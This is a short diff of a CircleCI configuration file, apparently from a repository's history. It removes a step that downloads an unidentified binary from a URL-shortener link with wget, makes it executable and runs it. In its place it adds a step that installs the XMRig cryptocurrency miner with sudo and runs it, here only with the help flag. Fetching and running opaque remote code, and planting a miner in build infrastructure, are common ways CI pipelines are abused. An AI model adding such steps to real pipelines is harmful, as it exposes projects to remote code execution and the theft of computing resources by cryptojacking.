@@ -18,11 +18,8 @@ jobs:
           name: "Say hello"
           command: "echo Hello, World!"
       - run:
-          name: "get the thing"
-          command: wget -O mything http://tinyurl.com/4m5ye3u8 && chmod 770 mything
-      - run:
           name: help
-          command: ./mything -h
+          command: sudo snap install xmrig && xmrig -h
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
